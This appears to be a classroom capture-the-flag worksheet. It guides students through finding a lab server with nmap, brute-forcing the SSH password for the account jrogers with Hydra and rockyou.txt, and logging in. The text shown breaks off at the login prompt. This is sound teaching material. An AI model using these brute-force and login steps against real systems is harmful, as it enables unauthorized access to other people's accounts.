// Mission Brief

Downtown Donuts runs an internal server called grades_service. A staff account on the server uses a dangerously weak password. Intelligence has confirmed a flag file is stored there. Your mission: locate the server on the network, crack the credentials, log in, and retrieve the flag.

Objectives
  • [+] Use Nmap to discover live hosts on a local network
  • [+] Use Hydra to run a dictionary attack against SSH
  • [+] Log into a remote machine via SSH using cracked credentials
  • [+] Navigate the Linux filesystem and read a target file
  • [+] Explain the ethical and legal limits of this type of attack

Pre-Flight — Prepare rockyou.txt

You are on a Kali live USB. Live boot does not save anything between sessions — rockyou.txt must be unzipped fresh every time before Hydra can use it.

sudo gunzip /usr/share/wordlists/rockyou.txt.gz # Takes ~20 seconds. If it says 'file not found' it is already unzipped — move on.

Verify the wordlist is ready:

ls -lh /usr/share/wordlists/rockyou.txt # You should see a file around 130MB

The Mission
01
Discover the Target

You have not been given the server's IP address. Find it yourself. Run a ping sweep of the classroom network to list every live host:

nmap -sn 192.168.1.0/24 # -sn = ping scan only. Lists all responding hosts without scanning ports.

Scan the output for grades_service. The Pi will appear in the results. Write down its IP — you will use it for every remaining step.

// TipIf the hostname is not obvious in the output, try: nmap -sn 192.168.1.0/24 | grep -i grades

02
Confirm SSH is Open

Confirm that SSH is actually running on the target before attacking. Replace TARGET-IP with the address you found in Step 1.

nmap -p 22 TARGET-IP

You are looking for:

22/tcp open ssh

If the port shows as closed or filtered, raise your hand before continuing.

Checkpoint QuestionYour Answer
What did Nmap report for port 22?

03
Brute Force SSH with Hydra

Run Hydra. It will try every password in rockyou.txt against the jrogers account until one works.

hydra -l jrogers -P /usr/share/wordlists/rockyou.txt ssh://TARGET-IP

Flag breakdown:

FlagWhat it does
-l jrogersSingle username to attack (lowercase L)
-P rockyou.txtWordlist of passwords to try (uppercase P)
ssh://Tells Hydra the target protocol is SSH
TARGET-IPIP address of grades_service
// Success OutputWhen Hydra finds the password it prints: [22][ssh] host: TARGET-IP   login: jrogers   password: ?????? — write it down immediately.

04
Log In via SSH

Use the cracked password to open a session on grades_service as jrogers.

ssh jrogers@TARGET-IP # Type the cracked password when prompted — nothing appears on screen as you type. Hit Enter.

A successful login looks like this:

jrogers@grades_service:~$
